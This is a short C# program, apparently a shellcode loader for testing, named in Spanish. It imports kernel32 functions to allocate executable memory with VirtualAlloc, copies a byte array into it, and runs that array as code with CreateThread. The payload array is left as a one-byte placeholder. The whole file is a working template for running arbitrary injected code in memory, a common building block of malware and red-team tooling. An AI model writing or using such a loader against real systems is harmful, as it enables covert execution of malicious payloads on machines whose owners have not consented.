using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Data;
using System.Runtime.InteropServices;

namespace cargador_que_pita
{
    class Program
    {
    	static void Main()
        {	
    				byte[] payload_final = { 00 };
		    		Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Probando shellcode ");
                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)payload_final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(payload_final, 0, (IntPtr)(funcAddr), payload_final.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
       

        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     
    }
   

}